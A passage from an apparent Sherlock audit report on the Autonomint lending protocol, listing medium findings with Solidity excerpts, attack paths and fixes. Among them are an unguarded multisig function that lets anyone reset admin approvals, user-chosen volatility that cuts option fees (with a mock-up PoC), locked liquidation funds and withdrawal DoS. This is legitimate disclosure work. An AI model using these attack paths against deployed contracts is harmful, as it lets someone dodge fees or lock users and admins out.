cds/ borrow ratio will be bigger than expected till all cds depositors(who opted for liquidation amount) don’t withdraw their deposited amount. So there may come a scenario when  the cds/borrow’s real  ratio may become below 0.2 but the protocol will calculate above 0.2(so new stablecoin can be minted/ cds users can withdraw if cds/borrow ratio  is below 0.2).


### PoC

_No response_

### Mitigation

update/decrease omniChainData.cdsPoolValue in the  function liquidationType1


# Issue M-15: Inability to Withdraw ETH/tokens in BorrowLiquidation Contract if `closeThePositionInSynthetix` is Called 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/569 

## Found by 
0x23r0, 0x37, pashap9990, valuevalk

### Summary

The `BorrowLiquidation` contract lacks the ability to withdraw ETH/native tokens or other tokens received from closing positions in Synthetix, potentially locking these assets within the contract indefinitely.


### Root Cause


```solidity

    function liquidationType2(
        address user,
        uint64 index,
        uint64 currentEthPrice
    ) internal {
        // Get the borrower and deposit details
        ITreasury.GetBorrowingResult memory getBorrowingResult = treasury.getBorrowing(user, index);
        ITreasury.DepositDetails memory depositDetail = getBorrowingResult.depositDetails;
        require(!depositDetail.liquidated, "Already Liquidated");

        // Check whether the position is eligible for liquidation
        uint128 ratio = BorrowLib.calculateEthPriceRatio(depositDetail.ethPriceAtDeposit, currentEthPrice);
        require(ratio <= 8000, "You cannot liquidate, ratio is greater than 0.8");

        uint256 amount = BorrowLib.calculateHalfValue(depositDetail.depositedAmountInETH);

        // Convert the ETH into WETH
        weth.deposit{value: amount}();
        // Approve it, to mint sETH
        bool approved = weth.approve(address(wrapper), amount);

        if (!approved) revert BorrowLiq_ApproveFailed();

        // Mint sETH
        wrapper.mint(amount);
        // Exchange sETH with sUSD
        synthetix.exchange(
            0x7345544800000000000000000000000000000000000000000000000000000000,
            amount,
            0x7355534400000000000000000000000000000000000000000000000000000000
        );

        // Calculate the margin
        int256 margin = int256((amount * currentEthPrice) / 100);
        // Transfer the margin to synthetix
        synthetixPerpsV2.transferMargin(margin);

        // Submit an offchain delayed order in synthetix for short position with 1X leverage
@>>        synthetixPerpsV2.submitOffchainDelayedOrder(
            -int((uint(margin * 1 ether * 1e16) / currentEthPrice)),
            currentEthPrice * 1e16
        );
    }

    /**
     * @dev Submit the order in Synthetix for closing position, can only be called by Borrowing contract
     */
    function closeThePositionInSynthetix() external onlyBorrowingContract {
        (, uint128 ethPrice) = borrowing.getUSDValue(borrowing.assetAddress(IBorrowing.AssetName.ETH));
        // Submit an order to close all positions in synthetix
@>>        synthetixPerpsV2.submitOffchainDelayedOrder(-synthetixPerpsV2.positions(address(this)).size, ethPrice * 1e16);
    }

    /**
     * @dev Execute the submitted order in Synthetix
     * @param priceUpdateData Bytes[] data to update price
     */
    function executeOrdersInSynthetix(
        bytes[] calldata priceUpdateData
    ) external onlyBorrowingContract {
        // Execute the submitted order
@>>        synthetixPerpsV2.executeOffchainDelayedOrder{value: 1}(address(this), priceUpdateData);
    }

```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L323-L387
- **Liquidation Process**: When an admin liquidates a position by opening a short position in Synthetix, several steps are involved:
  1. **Liquidation Initiation**: The admin calls `borrowing::liquidate` with `liquidationType2`.
  2. **Position Opening**: The `borrowLiquidation` contract executes `liquidationType2`, which opens a short position via `submitOffchainDelayedOrder`.
  3. **Order Execution**: The admin calls `borrowing::executeOrdersInSynthetix`, which in turn calls `borrowLiquidation::executeOrdersInSynthetix` to execute the order.
  4. **Position Closing**: The `closeThePositionInSynthetix` function is called to close the position.

- **Lack of Withdrawal Mechanism**: If the closure of the position in Synthetix results in ETH or other tokens sETH being sent to the `BorrowLiquidation` contract, there is no function provided to withdraw these funds, thus locking them within the contract.


### Internal pre-conditions

_No response_

### External pre-conditions

- An admin has initiated a liquidation through the borrowing contract.
- Synthetix's market conditions allow for position closure, potentially returning ETH or other tokens.


### Attack Path

_No response_

### Impact

ETH or other tokens sETH received by the borrowingLiquidation contract cannot be withdrawn, leading to liquidity loss.


### PoC

_No response_

### Mitigation

Add a function like `withdrawETH` or `withdrawTokens` to allow authorized withdrawals.

# Issue M-16: Malicious users can block admins from accessing setter functions 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/640 

## Found by 
0x37, 0xAristos, 0xTamayo, 0xundiscover, BitcoinEason, Boraicho, DenTonylifer, Galturok, John44, Ragnarok, chista0x, durov, onthehunt, pashap9990, santiellena, t.aksoy, theweb3mechanic, tjonair, volodya

### Summary

executeSetterFunction() in multiSign.sol lacks access control so malicious users can prevent admins from accessing setters.

### Root Cause

Some admin setters in borrowing.sol and CDS.sol require a call to multiSign.sol::executeSetterFunction(). If checks in executeSetterFunction() pass admins' approvals for the setters are reset. However, executeSetterFunction() can be called by anyone, so malicious users can call this function first and reset the admins' approvals which will block admins from calling the setters.
```solidity
    function executeSetterFunction(
        SetterFunctions _function
    ) external returns (bool) {
        // Get the number of approvals
        require(getSetterFunctionApproval(_function) >= requiredApprovals,"Required approvals not met");
        // Loop through the approved functions with owners mapping and change to false
        for (uint64 i; i < noOfOwners; i++) {
            approvedToUpdate[_function][owners[i]] = false;
        }
        return true;
    }
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/multiSign.sol#L304-L314

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Malicious user notices that an approval threshold for a certain setter was met
2. Malicious user calls executeSetterFunction() on multiSign.sol which resets the approvals
3. Admins get blocked from calling the setter

### Impact

5 admin setters in both borrowing.sol and CDS.sol require executeSetterFunction() call so all of them can be DOS'ed by malicious users. Some of setters like setAPR(), setLTV(), setBondRatio() in borrowing.sol can negatively impact user experience if DOS'ed.

### PoC

_No response_

### Mitigation

Implement access control to executeSetterFunction().

# Issue M-17: Missing cds deposit amount in swapCollateralForUSDT 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/719 

## Found by 
0x37

### Summary

swapCollateralForUSDT() will help to convert the remaining Ether to USDT. This part of upside collateral will be taken as the cds owner's profit. But we miss update the cds deposit amount. This will cause that cds owners fail to withdraw.

### Root Cause

In [Treasury.sol:804](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L804), when ether price increases and borrowers withdraw their collateral, there will be some remaining collateral because of the upside collateral. These remaining collateral will be taken as one part of the cds owner's profit and swapped to USDT.

This part of profit has already updated into the cds cumulative value(profit/loss), but we don't update the total cds deposit amount. This will cause that the total cds deposit amount will be less than cds owners should withdraw.

For example:
1. Alice deposits 1000 USDT/USDA into cds.
2. Bob borrows some USDA using 1 Ether.
3. Ether price increases, Bob repays his debt. There will be some remaining Ether(e.g. 0.01 Ether). We will swap 0.01 Ether to USDT. But the total cds deposit amount is 1000.
4. Alice withdraw her position, her expected return amount should be (1000 + 30(cumulative gain) + 50(option fee)). When we try to deduct from totalCdsDepositedAmount, (1000 - (1000 + 30)), this transaction will be reverted.
```solidity
    function swapCollateralForUSDT(
        IBorrowing.AssetName asset, // input token
        uint256 swapAmount, // input token amt
        bytes memory odosAssembledData
    ) external onlyCoreContracts returns (uint256) {
        (bool success, bytes memory result) = odosRouterV2.call{value: asset == IBorrowing.AssetName.ETH ? swapAmount : 0}(odosAssembledData);
}
```
```solidity
    function withdrawUserWhoNotOptedForLiq(
        CDSInterface.WithdrawUserParams memory params,
        CDSInterface.Interfaces memory interfaces,
        uint256 totalCdsDepositedAmount,
        uint256 totalCdsDepositedAmountWithOptionFees
    ) public returns (CDSInterface.WithdrawResult memory) {
        totalCdsDepositedAmount -= params.cdsDepositDetails.depositedAmount;
}
```
```solidity
        uint256 currentValue = cdsAmountToReturn(
            msg.sender,
            index,
            omniChainData.cumulativeValue,
            omniChainData.cumulativeValueSign,
            excessProfitCumulativeValue
        ) - 1; //? subtracted extra 1 wei
        // here we change the depositedAmount.
        cdsDepositDetails.depositedAmount = currentValue;
        uint256 returnAmount = cdsDepositDetails.depositedAmount + optionFees;
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

1. Alice deposits 1000 USDT/USDA into cds.
2. Bob borrows some USDA using 1 Ether.
3. Ether price increases, Bob repays his debt. There will be some remaining Ether(e.g. 0.01 Ether). We will swap 0.01 Ether to USDT. But the total cds deposit amount is 1000.
4. Alice withdraw her position, her expected return amount should be (1000 + 30(cumulative gain) + 50(option fee)). When we try to deduct from totalCdsDepositedAmount, (1000 - (1000 + 30)), this transaction will be reverted.

### Impact

We miss updating the total cds deposit amount when there is some upside collateral. This may cause cds owners fail to withdraw their positions.

### PoC

N/A

### Mitigation

After we swap collateral to USDT, we should mint the related USDA and add these to total cds deposit amount.

# Issue M-18: Unbounded Liquidation Iterations Can Lead to Withdrawal DoS 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/740 

## Found by 
0xNirix, 0xTamayo, 0xe4669da, Audinarey, santiellena, valuevalk, yoooo

### Summary

The protocol's requiring users to iterate through all liquidation events since their deposit during withdrawal will cause eventual transaction failure for early depositors as the number of liquidations grows over time, preventing them from withdrawing their funds.


### Root Cause

In `CDSLib.withdrawUser()` at https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L640 the forced iteration through all historical liquidations between deposit and withdrawal time creates potential for unbounded gas costs:

```solidity
// In CDSLib.withdrawUser:
if (params.cdsDepositDetails.optedLiquidation) {
    for (uint128 i = (liquidationIndexAtDeposit + 1); i <= params.omniChainData.noOfLiquidations; i++) {
        uint128 liquidationAmount = params.cdsDepositDetails.liquidationAmount;
        if (liquidationAmount > 0) {
            CDSInterface.LiquidationInfo memory liquidationData = omniChainCDSLiqIndexToInfo[i];
            // Calculate share for each liquidation
            uint128 share = (liquidationAmount * 1e10) / uint128(liquidationData.availableLiquidationAmount);
            // Process liquidation share...
        }
    }
}
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Early user deposits with liquidation enabled (`liquidationIndexAtDeposit = currentLiquidations`)
2. Protocol operates normally over months/years
3. Many liquidations occur, incrementing `noOfLiquidations`
4. When early user attempts to withdraw:
   - Must process EVERY liquidation since their deposit
   - Gas costs grow linearly with number of liquidations
   - Eventually exceeds block gas limit

### Impact

Early CDS depositors who opted for liquidation will be unable to withdraw their funds once the number of liquidations grows too large, as their withdrawal transactions will exceed block gas limits

### PoC

_No response_

### Mitigation

_No response_

# Issue M-19: Accumulated profit/losses by the cumulative value is not dealt with in `borrowingLiquidation::liquidationType1()`, leading to losses 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/755 

## Found by 
0x73696d616f

### Summary

`borrowingLiquidation::liquidationType1()` [reduces](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L248-L252) `omniChainData.totalVolumeOfBorrowersAmountinWei` and `omniChainData.totalCdsDepositedAmount` without any consideration for the cumulative values so far, leading to losses. The cumulative value at each price is calculated essentially by `priceDiff *  omniChainData.totalVolumeOfBorrowersAmountinWei / omniChainData.totalCdsDepositedAmount`, so changing these 2 variables without tracking correctly the cumulative value leads to issues, as shown below.

### Root Cause

In `borrowLiquidation.sol:248/252`, `totalCdsDepositedAmount` and `totalVolumeOfBorrowersAmountinWei` are modified without considering the cumulative values.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Consider a starting price of 1000 USD / ETH.
1. Cds deposit of 1000 USDa.
2. Borrow deposit of 1 ETH, borrowing 800 USDa.
3. Price drops to 800 USD / ETH.
4. Borrower deposits 1 wei to trigger cumulative value update, which registers a loss of roughly `1 * (1000 - 800) / 1000 = 0.2`.
5. Liquidation of the first borrower happens, which will reduce `omnichainData.totalCdsDepositAmount` to `360` (800 to treasury + 20 to abond calculated from 10% of 1000 - 800, cds profit of 1000 - 800 - 20 = 180, which yields a final cds deposited amount of 1000 - (800 + 20 - 180) = 360).
6. Cds depositor withdraws the 1000 USDa (disregarding the 1 wei borrower which doesnt really matter but technically would revert due to the 20% ratio), calculating a return amount of `1000 - 1000*0.2 = 800`. [Then](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L664-L665), `uint256 returnAmountWithGains = params.returnAmount + params.cdsDepositDetails.liquidationAmount - params.cdsDepositDetails.initialLiquidationAmount = 800 + 180 - 1000`, which underflows. 180 comes from doing 1000 - 820, where 820 is the liquidation amounted needed (debt + return to abond).

### Impact

Cds depositor can never withdraw until the cumulative value recovers. Alternatively, consider that calculating the cumulative value before liquidation yields -0.2, but after liquidating yields -0 (totalVolumeOfBorrowersAmountinWei becomes 0, so the cumulative value loss is 0), which goes to show that effectively it is incorrectly handled. Any user can trigger cumulative value updates before liquidations to force this bug, if needed.

### PoC

See the calculations above.

### Mitigation

Handle the cumulative values when liquidating.

# Issue M-20: dust amounts will be removed in OFT tokens 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/786 

## Found by 
pashap9990


### Root Cause

dust amounts will be removed in OFT tokens
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L779

### PoC
https://docs.layerzero.network/v2/developers/evm/oft/quickstart#token-transfer-precision

>The OFT Standard also handles differences in decimal precision before every cross-chain transfer by "cleaning" the amount from any decimal precision that cannot be represented in the shared system.
>The OFT Standard defines these small token transfer amounts as "dust".

when CDS depositors want to withdraw their assets from CDS contract also they get their share from liquidations amounts and if current chain dosen't have enough liquidity to send to user the protocol get need amount from other chain and let's assume needed amount is 1234567890123456789 rsETH and `CDS::withdraw` send message to other chain for getting need amount but because of remove dust amount 1234567000000000000 rsETH received from other chains and this causes treasury doesn't have enough rsETH to cover withdraw transaction

### Impact
Breaks core contract functionality

### Mitigation
consider to remove dust amount before send message to other chains

# Issue M-21: Interest generated by last bond will not go to anyone when liquidating as there is no bond amount to collect it 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/790 

## Found by 
0x73696d616f

### Summary

`borrowingLiquidation::liquidationType1()` [withdraws](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L295) the bond from the external protocol and updates the interest, but does not check if there is bond supply to distribute the interest to. Thus, if there are no bonds (if it was the only depositor being liquidated), it will be stuck. 

### Root Cause

In `borrowingLiquidation:295`, the bond is withdrawn from the external protocol without consideration for the supply of the bond or the number of borrowers.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. A single borrower exists that is liquidated, so the bond interest goes to nobody.

### Impact

Stuck bond interest.

### PoC

See links and explanation.

### Mitigation

Check if the bond supply is non null and the number of borrowers.

# Issue M-22: Borrowers can choose any volatility in order to pay less fees 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/792 

## Found by 
0x37, 0xAristos, IzuMan, John44, nuthan2x, pashap9990, santiellena, tedox, theweb3mechanic, valuevalk, volodya, wellbyt3, xKeywordx

### Summary

When borrowers deposit into borrowing.sol they have to specify a volatility parameter. It is used when calculating how much option fees they will be charged. This is problematic as depositors can choose any value in order to be charged the lowest possible number of fees.

### Root Cause

In Borrowing.depositTokens the volatility parameter is porvided by the user, thus users will always set it to an amount that results in less option fees.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. User deposits tokens into borrowing.sol.
2. Before depositing they calculate which value of `volatility` will reduce their option fees the most.
3. They use that value and are charged less fees then they should have been.

For example, in the protocol's tests the following value is used for the volatility: 50622665
https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/test/foundry/Borrowing.t.sol#L47

However, we can test that by setting the volatility to 10000000 the fees are significantly less.

### Impact

Users can reduce the number of option fees they have to pay.

### PoC

This is a mock-up function that calculates the option fee, exactly how it is currently calculated in the protocol. Standard parameters are set in order to isolate the effects of the `volatility` variable. It can be ran in any environment, just make sure to do the necessary imports.

By using the paramerter for `volatility` used in the tests 50622665, we receive 165738482.
By using 10000000, we receive 101927611.

```solidity
    function calculateOptionPrice(uint256 _ethVolatility)
        public
        view
        returns (uint256)
    {
        uint128 _ethPrice = 4000e2;
        uint256 _amount = 10e18;
        StrikePrice _strikePrice = StrikePrice(1);
        uint256 a = _ethVolatility;
        uint256 ethPrice = _ethPrice; /*getLatestPrice();*/
        // Get global omnichain data
        // Calculate the current ETH vault value
        uint256 totalVolumeOfBorrowersAmountinUSD = 10e18 * _ethPrice / 1e14;

        uint256 E = totalVolumeOfBorrowersAmountinUSD + (_amount * _ethPrice);
        // Check the ETH vault is not zero
        require(E != 0, "No borrowers in protocol");
        uint256 cdsVault;
        // If the there is no borrowers in borrowing, then the cdsVault value is deposited value itself
        // Else, get the cds vault current value from omnichain global data
        cdsVault = 1000e6 * USDA_PRECISION;

        // Check cds vault is non zero
        require(cdsVault != 0, "CDS Vault is zero");
        // Calculate b, cdsvault to eth vault ratio
        uint256 b = (cdsVault * 1e2 * OPTION_PRICE_PRECISION) / E;
        uint256 baseOptionPrice = ((sqrt(10 * a * ethPrice)) * PRECISION) /
            OPTION_PRICE_PRECISION +
            ((3 * PRECISION * OPTION_PRICE_PRECISION) / b); // 1e18 is used to handle division precision //18 * 5 /

        uint256 optionPrice;
        // Calculate option fees based on strike price chose by user
        if (_strikePrice == StrikePrice.FIVE) {
            // constant has extra 1e3 and volatility have 1e8
            optionPrice =
                baseOptionPrice +
                (400 * OPTION_PRICE_PRECISION * baseOptionPrice) /
                (3 * a);
        } else if (_strikePrice == StrikePrice.TEN) {
            optionPrice =
                baseOptionPrice +
                (100 * OPTION_PRICE_PRECISION * baseOptionPrice) /
                (3 * a);
        } else if (_strikePrice == StrikePrice.FIFTEEN) {
            optionPrice =
                baseOptionPrice +
                (50 * OPTION_PRICE_PRECISION * baseOptionPrice) /
                (3 * a);
        } else if (_strikePrice == StrikePrice.TWENTY) {
            optionPrice =
                baseOptionPrice +
                (10 * OPTION_PRICE_PRECISION * baseOptionPrice) /
                (3 * a);
        } else if (_strikePrice == StrikePrice.TWENTY_FIVE) {
            optionPrice =
                baseOptionPrice +
                (5 * OPTION_PRICE_PRECISION * baseOptionPrice) / //5 * x /
                (3 * a);
        } else {
            revert("Incorrect Strike Price");
        }
        return ((optionPrice * _amount) / PRECISION) / USDA_PRECISION; //x*18/30 = 6 -> x = 18
    }

    function testCalculateOptionPrice(
        uint256 _ethVolatility
    ) public view returns (uint256) {
        //set up mockup omni chain data
        uint256 noOfBorrowers = 1;
        uint256 totalCdsDepositedAmount = 10000e6;
        uint256 cdsPoolValue = 10000e6;
        StrikePrice _strikePrice = StrikePrice(1);
        uint256 _amount = 1e18;
        uint256 ethPrice = 4000e2;
        uint256 totalVolumeOfBorrowersAmountinUSD = 10e18 * ethPrice;
        uint256 a = _ethVolatility;

        // Calculate the current ETH vault value
        uint256 E = totalVolumeOfBorrowersAmountinUSD + (_amount * ethPrice);
        // Check the ETH vault is not zero
        require(E != 0, "No borrowers in protocol");
        uint256 cdsVault;
        // If the there is no borrowers in borrowing, then the cdsVault value is deposited value itself
        if (noOfBorrowers == 0) {
            cdsVault = totalCdsDepositedAmount * USDA_PRECISION;
        } else {
            // Else, get the cds vault current value from omnichain global data
            cdsVault = cdsPoolValue * USDA_PRECISION;
        }

        // Check cds vault is non zero
        require(cdsVault != 0, "CDS Vault is zero");
        // Calculate b, cdsvault to eth vault ratio
        uint256 b = (cdsVault * 1e2 * OPTION_PRICE_PRECISION) / E;
        uint256 baseOptionPrice = ((sqrt(10 * a * ethPrice)) * PRECISION) / OPTION_PRICE_PRECISION + ((3 * PRECISION * OPTION_PRICE_PRECISION) / b); // 1e18 is used to handle division precision

        uint256 optionPrice;
        // Calculate option fees based on strike price chose by user
        if (_strikePrice == StrikePrice.FIVE) {
            // constant has extra 1e3 and volatility have 1e8
            optionPrice = baseOptionPrice + (400 * OPTION_PRICE_PRECISION * baseOptionPrice) / (3 * a);
        } else if (_strikePrice == StrikePrice.TEN) {
            optionPrice = baseOptionPrice + (100 * OPTION_PRICE_PRECISION * baseOptionPrice) / (3 * a);
        } else if (_strikePrice == StrikePrice.FIFTEEN) {
            optionPrice = baseOptionPrice + (50 * OPTION_PRICE_PRECISION * baseOptionPrice) / (3 * a);
        } else if (_strikePrice == StrikePrice.TWENTY) {
            optionPrice = baseOptionPrice + (10 * OPTION_PRICE_PRECISION * baseOptionPrice) / (3 * a);
        } else if (_strikePrice == StrikePrice.TWENTY_FIVE) {
            optionPrice = baseOptionPrice + (5 * OPTION_PRICE_PRECISION * baseOptionPrice) / (3 * a);
        } else {
            revert("Incorrect Strike Price");
        }
        return ((optionPrice * _amount) / PRECISION) / USDA_PRECISION;
    }

    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}
```

### Mitigation

`volatility` should not be derived from user-input, but instead be set by an admin depending on the actual ETH volatility.

# Issue M-23: `GlobalVariables::oftOrCollateralReceiveFromOtherChains()` calculates the fee as if it was the same in both chains, which is false 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/795 

## Found by 
0x73696d616f

### Summary

`GlobalVariables::oftOrCollateralReceiveFromOtherChains()` send a message to the other chain requesting token/eth transfers to the current chain. In the process, it forwards ETH to pay for the cross chain transfer from the destination to the current chain. However, it calculates the fee as if the direction was current to destination, when in reality it is the opposite and the fee will be different. Thus, it will either overchage or revert in the destination chain.

### Root Cause

In `GlobalVariables::oftOrCollateralReceiveFromOtherChains()` fee is calculated as if the [direction](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/GlobalVariables.sol#L250) is current to destination, when it is the opposite.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. `GlobalVariables::oftOrCollateralReceiveFromOtherChains()` is called, but the fee is incorrectly calculated.

### Impact

Overcharging of the fee or charging too little, which will lead to reverts on the destination chain.

### PoC

See links.

### Mitigation

Add a variable admin set to track the costs.

# Issue M-24: `GlobalVariables::oftOrCollateralReceiveFromOtherChains()` always charges twice the collateral on `COLLATERAL_TRANSFER`, which is not needed 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/798 

## Found by 
0x73696d616f

### Summary

`GlobalVariables::oftOrCollateralReceiveFromOtherChains()` frequently occurs losses by forwarding too much ETH as it assumes collateral transfer always happen for the 2 tokens + eth, which is not true as it can just be ETH and it skips collateral transfers when the amount is [null](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/GlobalVariables.sol#L606). This will happen on liquidations for example as the collateral my just be ETH and it needs to fetch ETH from the other chain, so the other chain will only send ETH and the 2 other collateral transfers can be skipped. However, they will still be payed here, taking the user the loss.

### Root Cause

In `GlobalVariables.sol:290/300`, collateral transfers are always charged even if amounts to send are null.

### Internal pre-conditions

None.

### External pre-conditions

None.

### Attack Path

1. Borrower is liquidated and had deposited ETH.
2. Chain does not have enough ETH and requests from other chain. It pays for 2 extra collateral transfers.
3. Other chain sends ETH and will have leftover native.

### Impact

Losses keep being accrued as it overcharges fees.

### PoC

See links above.

### Mitigation

Check if the amount is null and only charge fees for both collateral tokens if the amount is non null.

# Issue M-25: Treasury will run out of liquidated funds to give to withdrawing users causing withdrawals to fail 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/799 

## Found by 
John44, Ruhum, almurhasan, pashap9990

### Summary

The cached liquidated asset amount is never decreased causing the treasury to believe that it has more funds than it actual does.

### Root Cause

In [CDSLib.sol:687](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L687), it calls `getLiquidatedCollateralToGive()` with the available liquidated assets set as `liquidatedCollateralAmountInWei(x)`:

```sol
              // call getLiquidatedCollateralToGive in cds library to get in which assests to give liquidated collateral
                (
                    totalWithdrawCollateralAmountInETH,
                    params.ethAmount,
                    weETHAmount,
                    rsETHAmount,
                    collateralToGetFromOtherChain
                ) = getLiquidatedCollateralToGive(
                    CDSInterface.GetLiquidatedCollateralToGiveParam(
                        params.ethAmount,
                        weETHAmount,
                        rsETHAmount,
                        interfaces.treasury.liquidatedCollateralAmountInWei(IBorrowing.AssetName.ETH),
                        interfaces.treasury.liquidatedCollateralAmountInWei(IBorrowing.AssetName.WeETH),
                        interfaces.treasury.liquidatedCollateralAmountInWei(IBorrowing.AssetName.WrsETH),
                        interfaces.treasury.totalVolumeOfBorrowersAmountLiquidatedInWei(),
                        params.weETH_ExchangeRate,
                        params.rsETH_ExchangeRate
                    )
                );
```

If the `liquidatedCollateralAmountInWei` for a token is bigger than the amount of tokens the contract needs, it will simply transfer the whole amount in that single token, see [CDSLib.sol:324](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L324)

```sol
    function getLiquidatedCollateralToGive(
        CDSInterface.GetLiquidatedCollateralToGiveParam memory param
    ) public pure returns (uint128, uint128, uint128, uint128, uint128) {
        // calculate the amount needed in eth value
        uint256 totalAmountNeededInETH = param.ethAmountNeeded + (param.weETHAmountNeeded * param.weETHExRate) / 1 ether + (param.rsETHAmountNeeded * param.rsETHExRate) / 1 ether;
        // calculate amount needed in weeth value
        uint256 totalAmountNeededInWeETH = (totalAmountNeededInETH * 1 ether) / param.weETHExRate;
        // calculate amount needed in rseth value
        uint256 totalAmountNeededInRsETH = (totalAmountNeededInETH * 1 ether) / param.rsETHExRate;

        uint256 liquidatedCollateralToGiveInETH;
        uint256 liquidatedCollateralToGiveInWeETH;
        uint256 liquidatedCollateralToGiveInRsETH;
        uint256 liquidatedCollateralToGetFromOtherChainInETHValue;
        // If this chain has sufficient amount
        if (param.totalCollateralAvailableInETHValue >= totalAmountNeededInETH) {
            // If total amount is avaialble in eth itself
            if (param.ethAvailable >= totalAmountNeededInETH) {
                liquidatedCollateralToGiveInETH = totalAmountNeededInETH;
                // If total amount is avaialble in weeth itself
            } else if (param.weETHAvailable >= totalAmountNeededInWeETH) {
                // ...
            } else if (param.rsETHAvailable >= totalAmountNeededInRsETH) {
                // ...
            } else {
                // ...
            }
        } else {
            // ...
        }
        return (
            uint128(totalAmountNeededInETH),
            uint128(liquidatedCollateralToGiveInETH),
            uint128(liquidatedCollateralToGiveInWeETH),
            uint128(liquidatedCollateralToGiveInRsETH),
            uint128(liquidatedCollateralToGetFromOtherChainInETHValue)
        );
    }
```

The given amount is then transferred from the treasury, see [CDSLib.sol:825](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L825):

```sol
                if (params.ethAmount != 0) {
                    params.omniChainData.collateralProfitsOfLiquidators -= totalWithdrawCollateralAmountInETH;
                    // Call transferEthToCdsLiquidators to tranfer eth
                    interfaces.treasury.transferEthToCdsLiquidators(
                        msg.sender,
                        params.ethAmount
                    );
                }
```

The same thing applies to weETH and wrsETH as well.

The issue is that after a user has withdrawn their funds, the cached available asset amount isn't decreased. In the treasury contract, `liquidatedCollateralAmountInWei` is only updated in the `updateDepositedCollateralAmountInWei()` function where the value is increased:

```sol
    function updateDepositedCollateralAmountInWei(
        IBorrowing.AssetName asset,
        uint256 amount
    ) external onlyCoreContracts {
        depositedCollateralAmountInWei[asset] -= amount;
        liquidatedCollateralAmountInWei[asset] += amount;
    }
```

So even after a user has withdrawn and the actual collateral asset balance has decreased, `liquidatedCollateralAmountInWei()` will return the same value. That will cause the CDSLib contract to again try to send the full amount in that given token ignoring the fact that the treasury doesn't hold enough funds. When the transfer is executed it will revert, causing the tx to revert and the user's funds to be stuck.

### Internal pre-conditions

none

### External pre-conditions

none

### Attack Path

none

### Impact

CDS users who have opted into liquidation won't be able to withdraw their funds.

### PoC

_No response_

### Mitigation

The value should be decreased in `withdrawUser()`.

# Issue M-26: Yield form LRTs are forever stuck in the protocol and cannot be withdrawn 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/818 

## Found by 
0x73696d616f, Audinarey

### Summary

During borrower [liquidation](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L265-L273) (`liquidationType1()`) and [withdrawal from the CDS](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L667-L670), the yield from LRTs is updated and stored in the treasury.

### Root Cause



```solidity
File: CDSLib.sol
667:      @>         interfaces.treasury.updateYieldsFromLiquidatedLrts( // @audit SUBMITTED-HIGH: these funds are stuck forever in the treasury
668:                     weETHAmount - ((weETHAmountInETHValue * 1 ether) /  params.weETH_ExchangeRate) + 
669:                     rsETHAmount - ((rsETHAmountInETHValue * 1 ether) /  params.rsETH_ExchangeRate)
670:                 );


File: borrowLiquidation.sol
265:         uint256 yields = depositDetail.depositedAmount - ((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate);
266: 
267:         // Update treasury data
268:         treasury.updateTotalVolumeOfBorrowersAmountinWei(depositDetail.depositedAmountInETH);
269:         treasury.updateTotalVolumeOfBorrowersAmountinUSD(depositDetail.depositedAmountUsdValue);
270:         treasury.updateDepositedCollateralAmountInWei(depositDetail.assetName, depositDetail.depositedAmountInETH);
271:         treasury.updateDepositedCollateralAmountInUsd(depositDetail.assetName, depositDetail.depositedAmountUsdValue);
272:         treasury.updateTotalInterestFromLiquidation(totalInterestFromLiquidation);
273:  @>     treasury.updateYieldsFromLiquidatedLrts(yields); // @audit ??? questionable

```

